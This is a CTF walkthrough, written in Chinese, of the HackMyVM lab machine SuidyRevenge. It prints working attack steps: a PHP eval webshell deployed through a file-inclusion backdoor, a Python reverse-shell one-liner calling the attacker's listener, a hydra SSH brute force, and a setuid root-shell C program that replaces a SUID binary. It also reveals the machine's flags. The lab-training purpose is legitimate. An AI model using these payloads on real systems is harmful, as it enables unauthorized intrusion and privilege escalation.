# SuidyRevenge

:::note

[Linux VM] [Tested on VirtualBox] created by || sml

⏲️ Release Date // 2020-10-02

✔️ MD5 // c3278d7fedcca7de2ac31a3d6f65ab19

☠ Root // 73

💀 User // 77

📝Notes //
Enjoy the path to get root. Tested on VBox.

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.109
```

## nmap 信息搜集

```plaintext
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 99:04:21:6d:81:68:2e:d7:fe:5e:b2:2c:1c:a2:f5:3d (RSA)
|   256 b2:4e:c2:91:2a:ba:eb:9c:b7:26:69:08:a2:de:f2:f1 (ECDSA)
|_  256 66:4e:78:52:b1:2d:b6:9a:8b:56:2b:ca:e5:48:55:2d (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
```

## web 服务

尝试直接请求

```html
Im proud to announce that "theuser" is not anymore in our servers.
Our admin "mudra" is the best admin of the world.
-suidy

<!--

"mudra" is not the best admin, IM IN!!!!
He only changed my password to a different but I had time
to put 2 backdoors (.php) from my KALI into /supersecure to keep the access!

-theuser

-->
```

根据提示信息，查看 Parrot 自带的 webshell 文件

```plaintext title="/usr/share/webshells/php"
drwxr-xr-x 1 root root   64  1 月 22 日 03:13 findsocket
-rw-r--r-- 1 root root 2.8K 2021 年 11 月 21 日 php-backdoor.php
-rwxr-xr-x 1 root root 5.4K 2021 年 11 月 21 日 php-reverse-shell.php
-rw-r--r-- 1 root root  14K 2021 年 11 月 21 日 qsd-php-backdoor.php
-rw-r--r-- 1 root root  328 2021 年 11 月 21 日 simple-backdoor.php
```

根据文件列表进行探测，得到以下信息

```plaintext title="http://192.168.56.109/supersecure/simple-backdoor.php?cmd=ls"
mysuperbackdoor.php
simple-backdoor.php
```

经过探测，`simple-backdoor.php` 为命令执行后门，但是可能存在过滤，只允许纯字母 + 数字的指令执行

`mysuperbackdoor.php` 为文件读取的后门，使用 `php://filter/read=convert.base64-encode/resource=` 可以绕过解析读取 php 文件的源码

```php title="simple-backdoor.php"
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        $result = preg_replace("/[^a-zA-Z0-9]+/", "", $cmd);
        system($result);
        echo "</pre>";
        die;
}

?>
```

```php title=""
<?php
include $_REQUEST['file'];
?>
```

借助 php 的 LFI，可以实现 webshell 部署

```plaintext
http://192.168.56.109/supersecure/mysuperbackdoor.php?file=data:text/plain,<?php @eval($_POST['a']) ?>
```

成功实现 webshell 部署，进而反弹 shell

```shell
┌─[✗]─[randark@parrot]─[~/tmp]
└──╼ $nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.109] 58444
whoami
www-data
```

提升 pty

```shell
# python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
┌─[randark@parrot]─[~]
└──╼ $pwncat-cs -lp 8888
[14:33:30] Welcome to pwncat 🐈!
[14:33:39] received connection from 192.168.56.109:42180
[14:33:39] 192.168.56.109:42180: registered new host w/ db
(local) pwncat$ back
(remote) www-data@suidyrevenge:/var/www/html/supersecure$ whoami
www-data
```

## User - www-data

### 题目提示

```plaintext title="/var/www/html/murdanote.txt"
I always lost my password so Im using
one password from rockyou.txt !

-murda
```

## SSH 爆破 - murda

```shell
┌─[✗]─[randark@parrot]─[~/tmp]
└──╼ $hydra -v -V -I -l murda -P /usr/share/wordlists/rockyou.txt 192.168.56.109 ssh -t 4
......
[22][ssh] host: 192.168.56.109   login: murda   password: iloveyou
```

## User - murda

```shell
┌─[randark@parrot]─[~/tmp]
└──╼ $pwncat-cs murda@192.168.56.109
[14:37:23] Welcome to pwncat 🐈!
Password: ********
[14:37:25] 192.168.56.109:22: normalizing shell path
           192.168.56.109:22: registered new host w/ db
(local) pwncat$ back
(remote) murda@suidyrevenge:/home/murda$ whoami
murda
```

### 题目提示

```plaintext title="/home/murda/secret.txt"
I know that theuser is here!
I just got the id_rsa from "violent".
I will put the key in a secure place for theuser!
I hope he find it.
Remember that rockyou.txt is your friend!
```

### 探测现有用户

```shell
(remote) murda@suidyrevenge:/home$ ls -lh
total 32K
drwxrwxr--  3 murda   murda   4.0K Oct  1  2020 murda
drwxrwx---  2 ruin    ruin    4.0K Oct  1  2020 ruin
drwxrwxr-x  3 suidy   suidy   4.0K Oct  2  2020 suidy
drwxrwx---  3 theuser theuser 4.0K Oct  2  2020 theuser
drwxrwx---  3 violent violent 4.0K Oct  1  2020 violent
drwxrwx---  2 yo      yo      4.0K Oct  1  2020 yo
```

## User - theuser

根据上文提到的 web 服务返回的数据，从中可以得到一组凭据

```plaintext
theuser:different
```

尝试登陆

```shell
┌─[randark@parrot]─[~]
└──╼ $pwncat-cs theuser@192.168.56.109
[14:51:47] Welcome to pwncat 🐈!
Password: *********
[14:51:50] 192.168.56.109:22: normalizing shell path
[14:51:51] 192.168.56.109:22: registered new host w/ db
(local) pwncat$ back
(remote) theuser@suidyrevenge:/home/theuser$ whoami
theuser
```

### flag - user

```shell
(remote) theuser@suidyrevenge:/home/theuser$ cat user.txt

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,



HMVbisoususeryay
```

### 环境探测

根据探测，`suidy` 用户的用户目录可以访问

```shell
(remote) theuser@suidyrevenge:/home/suidy$ ls -lah
total 52K
drwxrwxr-x 3 suidy suidy   4.0K Oct  2  2020 .
drwxr-xr-x 8 root  root    4.0K Oct  1  2020 ..
-rw------- 1 suidy suidy     25 Oct  1  2020 .bash_history
-rwxrwx--- 1 suidy suidy    220 Oct  1  2020 .bash_logout
-rwxrwx--- 1 suidy suidy   3.5K Oct  1  2020 .bashrc
drwxr-xr-x 3 suidy suidy   4.0K Oct  1  2020 .local
-rw-r----- 1 suidy suidy    262 Oct  1  2020 note.txt
-rwxrwx--- 1 suidy suidy    807 Oct  1  2020 .profile
-rwsrws--- 1 root  theuser  17K Oct  2  2020 suidyyyyy
```

其中，`suidyyyyy` 具有 suid，并且当前用户具有执行的权限，直接执行即可横向

```shell
(remote) theuser@suidyrevenge:/home/suidy$ ./suidyyyyy
suidy@suidyrevenge:/home/suidy$ whoami
suidy
```

## User - suidy

### 题目提示

```plaintext title="/home/suidy/note.txt"
I know that theuser is not here anymore but suidyyyyy is now more secure!
root runs the script as in the past that always gives SUID to suidyyyyy binary
but this time also check the size of the file.
WE DONT WANT MORE "theuser" HERE!.
WE ARE SECURE NOW.

-suidy
```

### 编写恶意程序

```c
#include<stdlib.h>

int main(){
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

编译后执行替换

```shell
(remote) theuser@suidyrevenge:/home/theuser$ nano suid.c
(remote) theuser@suidyrevenge:/home/theuser$ gcc suid.c -o suid
(remote) theuser@suidyrevenge:/home/theuser$ cp ./suid /home/suidy/suidyyyyy 
(remote) theuser@suidyrevenge:/home/theuser$ cd /home/suidy/
(remote) theuser@suidyrevenge:/home/suidy$ ls -lh
total 24K
-rw-r----- 1 suidy suidy   262 Oct  1  2020 note.txt
-rwsrws--- 1 root  theuser 17K Feb 16 02:10 suidyyyyy
(remote) theuser@suidyrevenge:/home/suidy$ ./suidyyyyy 
root@suidyrevenge:/home/suidy# whoami
root
```

## User - root

### flag- root

```shell
root@suidyrevenge:/root# cat root.txt 
                                                                                
                                   .     **                                     
                                *           *.                                  
                                              ,*                                
                                                 *,                             
                         ,                         ,*                           
                      .,                              *,                        
                    /                                    *                      
                 ,*                                        *,                   
               /.                                            .*.                
             *                                                  **              
             ,*                                               ,*                
                **                                          *.                  
                   **                                    **.                    
                     ,*                                **                       
                        *,                          ,*                          
                           *                      **                            
                             *,                .*                               
                                *.           **                                 
                                  **      ,*,                                   
                                     ** *,                                      
                                                                                
                                                                                
HMVvoilarootlala  
```
